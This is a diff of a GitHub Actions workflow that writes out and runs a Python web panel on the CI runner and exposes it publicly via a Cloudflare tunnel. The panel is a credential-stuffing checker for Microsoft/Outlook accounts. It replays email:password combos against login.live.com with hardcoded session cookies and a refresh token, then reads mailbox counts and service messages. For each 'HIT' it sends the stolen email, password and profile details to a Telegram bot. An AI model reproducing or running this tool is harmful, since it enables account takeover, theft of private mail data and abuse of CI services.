@@ -10,20 +10,10 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v4
-
-      - name: Setup Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.10'
-
-      - name: Install Dependencies
-        run: pip install flask requests
-
-      - name: Run Web Panel
+      - name: Setup and Run Panel
         run: |
-          python -c "
+          pip install flask requests > /dev/null 2>&1
+          cat > server.py << 'PYEOF'
           import os, threading, requests, urllib.parse, re, sys, time, random, uuid, json
           from flask import Flask, request, redirect, url_for, render_template_string, send_file
           from queue import Queue
@@ -82,8 +72,8 @@ jobs:
               def bababiziz(self, email, password, captures, results):
                   try:
                       dursunburasi = '\n'.join(f'• {k}: {v}' for k, v in captures.items())
-                      fadimeoc = '\n'.join(f'✅ {svc} ({data[\"total\"]} mesaj) — {data[\"last_msg\"][:50]}' for svc, data in results.items())
-                      kombinzaradan = f'🔱 <b>HIT BULUNDU</b>\n\n🔱 <b>Email:</b> <code>{email}</code>\n🔱 <b>Şifre:</b> <code>{password}</code>\n\n🔱 <b>Profil:</b>\n{dursunburasi}\n\n🔱 <b>Servisler:</b>\n{fadimeoc}\n\n⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n<b>PROGRAM :</b> @octopusmarjinal'
+                      fadimeoc = '\n'.join(f'✅ {svc} ({data["total"]} mesaj) — {data["last_msg"][:50]}' for svc, data in results.items())
+                      kombinzaradan = f'🔱 <b>HIT BULUNDU</b>\n\n🔱 <b>Email:</b> <code>{email}</code>\n🔱 <b>Şifre:</b> <code>{password}</code>\n\n🔱 <b>Profil:</b>\n{dursunburasi}\n\n🔱 <b>Servisler:</b>\n{fadimeoc}\n\n⚊⚊⚊⚊⚊⚊⚊⚊⚋⚊⚊⚊⚊⚊\n<b>PROGRAM :</b> @octopusmarjinal'
                       requests.post(f'{self.temelburasi}/sendMessage', json={'chat_id': self.chat_id, 'text': kombinzaradan, 'parse_mode': 'HTML', 'disable_web_page_preview': True}, timeout=15)
                   except Exception: pass
 
@@ -108,9 +98,9 @@ jobs:
               def beniyuregineyaz(text): return urllib.parse.quote(text, safe='')
               def artikhemsireyim(self): return '; '.join(f'{c.name}={c.value}' for c in self.session.cookies)
               def kodyazmayibirakacam(self, text):
-                  match = re.search(r'[?&]code=([^&#\s\"\']+)', text)
+                  match = re.search(r'[?&]code=([^&#\s"\']+)', text)
                   if match: return urllib.parse.unquote(match.group(1))
-                  match = re.search(r'\"code\"\s*:\s*\"([^\"]+)\"', text)
+                  match = re.search(r'"code"\s*:\s*"([^"]+)"', text)
                   if match: return match.group(1)
                   return None
               def login(self):
@@ -122,7 +112,7 @@ jobs:
                   self.session.cookies.set('MSPRequ', 'id=N&lt=1726223182&co=1', domain='login.live.com')
                   self.session.cookies.set('uaid', '3d0f0eea617a4b9c-a747100934dca583', domain='login.live.com')
                   self.session.cookies.set('RefreshTokenSso', 'Dgk7lfaShHcQZcgrBYCkHQ6rOBVO9XNFLG0UAhAxkdv3VSeG!mMx2aqqQMTkrp8KSTESlUReGSb3Ga!BIkVRZHv!QEw85VrPUHcQOwkT5gYS2J*TjQeUULzkFbF1HDRsHYZIIfqG741wN3NfHwr6KXo$', domain='login.live.com')
-                  self.session.cookies.set('MSPOK', '\$uuid-90478d00-dd39-405a-8731-bd22329637de', domain='login.live.com')
+                  self.session.cookies.set('MSPOK', '$uuid-90478d00-dd39-405a-8731-bd22329637de', domain='login.live.com')
                   self.session.cookies.set('OParams', '11O.DsdeQF2y3fsl3M9I0rhb6w95IwZaderdmXLRh6pKeUGbd1PqLEw8JTc28KdKuOsGYu!PzrPkEGJhuQmW*uMSRDsAjGDX0QElSnaFWMErTliKbWK5a9BWYp2c!aK8z1lwcscrbAr1548TFJxSZPl!9Eqk08i0mhxSQsfi7uARKID6R49B4664XQmPGN3CUdfFYjYwW4!lCPLt5BN9cFkaimWnB1wTV!klMzGgtIdHbgmRPzb4WqATStbDaOgvt6JQ6ceoWkz7q*lyN7B4URaaaUJyG1A4oUMzS!7EStUP250VY3RPJB!YAQgq0ft9H4FvXQEjx!FkN7WskkkMbJZ*wAZYEGRgEoPyigP*vrE5zjQIfJ4VB5NvsuhAYbCS5bNRPxOFO7b2o5!AC2jNOGSJytHxKQQnCUcTBcvx1PAjAi2kuEPWTiOjJOxXidNu33PX5kNTriDyGCz46KlHu7ZnFS3QryeAf0lgEZyanDBiFpBvFZE1kxFXen20cH4GIavuKM!99iqdMI6vee7AQgrrDerhcvoSLfVnii5K7xW1B1NUZxihRGFhHw8oJGm4TV2Krs5ICuvSJz9asEHNwvDBZR37UPJjrfBqHkoDM8!3nQ**PGfGam1Vv3xXpjaCuNUy4LCvUrrrO3cyBYCdKp0J16JvEATRytd!jfu*OwJpLnwOoQ6oRVyqFAC99Dp9elLxcbE2rZnZ1gUblQcmFY3ZcHtyLC7faZt*4SzJEaFZ1FCYIgSjyEajoc4213d1dz7vdfBJwsihLN!Y8QoIp0gFo!DM6ltWkmowBRD1hxr!!M60DG5jz75KOPdvVDqlnvbVXf0LqEMoRwsruk65gEF3Dy1Z!yNS5V6q5PSFQj5SvyG!EWon7Mbn6KsyTGBP9tOLdmFHVlie7IX8lBlQf2*z2PjGlEhUn!V6OM0*GHDtqyPuoJMtBIhBSFG4etMhl4UJvOcnyzWdw0PNhGBt6DUiTlDGmtKJMgkH4KyhI1bUoJ26pGSF0mAlFpqtiSNcSdcz1C*0HLUMTbtNW!6q9JZSgF3Gu!8TOsaqV60kiA3iQfQg9IrEtTt6RXDhgLsHzzYYpJy51cRGIk4u5hbVFNAyTZFUuSBpMWCPXFMqo6ZRbkpgKgl7c!j2kbrtVtUC83paGru7Af4!rS1qMgz4xP9d1W7yZDJCd38FmQgUzMFmO8wH0ISVq9m4XbGnzJDvlkI6PI0H1XJz008Q9I5VjDRgzlHPZ4beD8UeTbbt!*r0sZh5f39oQEkpUWgbL2VVQQEKzAdO0O6360kXJObygeg7gr8GIOYsjq4w7W9BX52ESfBBy0dmsx3FPiHgnkCI9lrp!4G!H0sEuPW38zcDrMLF1GxsfGRZ5cL6cfNSo75QFqqQ4j372o6Cr5XjBXv*8wnrB5iYlbZkkkGtLkdhPvo8Wy9Lxl!jr80Y1n98mGdTZPId', domain='login.live.com')
                   self.session.cookies.set('MicrosoftApplicationsTelemetryDeviceId', 'ac497201-f3d3-41a7-883c-c50515eabaca', domain='login.live.com')
                   self.session.cookies.set('ai_session', 'fiaZX16SGDUFsD1Xch3TeF|1726223182490|1726223182490', domain='login.live.com')
@@ -172,7 +162,7 @@ jobs:
                   try: self.session.get(buinboxtugaliba, headers=herseybirbirinegirdiamk, timeout=30)
                   except Exception: pass
                   hallederizsikintiyok = 'https://login.microsoftonline.com/9188040d-6c67-4c5b-b112-36a304b66dad/oauth2/v2.0/token'
-                  data = 'client_info=1&client_id=0000000048170EF2' + f'&refresh_token={urllib.parse.quote(self.pornotoken, safe=\"\")}&scope=profile%20openid%20offline_access%20https%3A%2F%2Fsubstrate.office.com%2F.default&grant_type=refresh_token'
+                  data = 'client_info=1&client_id=0000000048170EF2' + f'&refresh_token={urllib.parse.quote(self.pornotoken, safe="")}&scope=profile%20openid%20offline_access%20https%3A%2F%2Fsubstrate.office.com%2F.default&grant_type=refresh_token'
                   headers = {'Accept-Encoding': 'gzip', 'client-request-id': '3d0f0eea-617a-4b9c-a747-100934dca583', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8', 'correlation-id': '3d0f0eea-617a-4b9c-a747-100934dca583', 'Host': 'login.microsoftonline.com', 'return-client-request-id': 'false', 'User-Agent': 'Mozilla/5.0 (compatible; MSAL 1.0)', 'x-client-OS': '32', 'x-client-SKU': 'MSAL.xplat.android', 'x-client-src-SKU': 'MSAL.xplat.android', 'x-client-Ver': '1.1.0+ad8a8025'}
                   time.sleep(random.uniform(0.1, 0.3))
                   try:
@@ -227,7 +217,7 @@ jobs:
                   try:
                       resp = self.session.post(url, headers=headers, timeout=30)
                       text = resp.text
-                      burasisey = [r'DisplayName\\\\\":\\\\\"Inbox\\\\\",\\\\\"TotalCount\\\\\":(\\\\d+)', r'DisplayName\":\"Inbox\",\"TotalCount\":(\\d+)', r'\"Inbox\".*?\"TotalCount\":(\\d+)', r'TotalCount\":(\\d+).*?\"Inbox\"']
+                      burasisey = [r'DisplayName\\\":\\\"Inbox\\\",\\\"TotalCount\\\":(\\d+)', r'DisplayName":"Inbox","TotalCount":(\d+)', r'"Inbox".*?"TotalCount":(\d+)', r'TotalCount":(\d+).*?"Inbox"']
                       for pat in burasisey:
                           match = re.search(pat, text)
                           if match:
@@ -333,7 +323,7 @@ jobs:
                           status = 'BAD'; break
                   if status == 'HIT':
                       stats.yesiam('hit')
-                      portakal = [f'{s}({d[\"total\"]})' for s, d in results.items()]
+                      portakal = [f'{s}({d["total"]})' for s, d in results.items()]
                       mandelina = ' | '.join(portakal)
                       yormamoruk = ' | '.join(f'{k}={v}' for k, v in babazingozingo.items())
                       line = f'{email}:{password} | {yormamoruk} | {mandelina}'
@@ -478,15 +468,16 @@ jobs:
 
           if __name__ == '__main__':
               app.run(host='0.0.0.0', port=8080)
-          " &
+          PYEOF
+          python server.py &
 
       - name: Expose Tunnel and Keep Alive
         run: |
           wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
           sudo dpkg -i cloudflared-linux-amd64.deb
           cloudflared tunnel --url http://localhost:8080 2>&1 | tee tunnel.log &
-          sleep 8
-          LINK=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' tunnel.log | head -n 1)
+          sleep 10
+          LINK=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' tunnel.log | head -n 1)
           if [ -n "$LINK" ]; then
               echo ""
               echo "=============================================="
